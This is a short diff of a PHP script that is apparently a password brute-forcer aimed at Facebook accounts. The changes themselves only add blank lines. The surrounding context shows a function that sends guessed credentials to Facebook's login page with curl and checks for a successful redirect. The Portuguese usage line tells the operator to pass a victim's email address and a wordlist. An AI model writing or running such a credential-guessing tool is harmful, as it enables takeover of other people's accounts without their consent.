@@ -16,6 +16,7 @@
     $word = $argv[2];
 
     function banner(){
+    	
       echo "
              ____________________________________________________
             /                                                    \
@@ -55,6 +56,7 @@
     }
 
     function brute($usuario, $senha){
+    	
       $ch = curl_init();
       curl_setopt($ch, CURLOPT_URL, "https://login.facebook.com/login.php?m&next=http://m.facebook.com/home.php");
       curl_setopt($ch, CURLOPT_HEADER, true);
@@ -70,6 +72,7 @@
       $source = curl_exec($ch);
       $fp = fopen("log.html", "w");
       fwrite($fp, $source);
+      
       if(eregi("facebook.com/home.php", $source)){
         return true;
       }else{
@@ -94,4 +97,5 @@
     }else{
     	echo "[-] Ajuda: php facebook.php emaildavitima@gmail.com wordlist.txt";
     }
+    
 ?>
